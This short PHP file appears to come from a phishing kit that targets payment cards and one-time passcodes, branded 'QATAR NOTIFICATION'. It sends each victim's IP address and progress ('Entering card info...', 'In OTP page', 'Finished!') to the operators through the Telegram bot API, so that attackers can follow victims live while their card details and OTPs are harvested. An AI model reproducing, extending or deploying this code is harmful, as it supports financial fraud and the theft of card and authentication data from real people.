<?php 
require '../config.php';

function note($statu){
	global $bot_token;
	global $chat_ids;
	foreach($chat_ids as $chat_id){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=html&text=".urlencode("<b>[ QATAR NOTIFICATION ]</b>\nVICTIM IP : ".$_SERVER['REMOTE_ADDR']."\nSTATU : $statu"));
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	$res =  curl_exec($c);
	curl_close($c);
	}
	
}


if(isset($_POST['otping'])){
	note("Entering OTP...");
}if(isset($_POST['otpview'])){
	note("In OTP page");
}if(isset($_POST['otperrorview'])){
	note("In OTP Error page");
}
if(isset($_POST['waiting'])){
	note("Waiting $seconds seconds...");
}
if(isset($_POST['cardview'])){
	note("in card page");
}if(isset($_POST['carding'])){
	note("Entering card info...");
}
if(isset($_POST['finishview'])){
	note("Finished!");
}
?>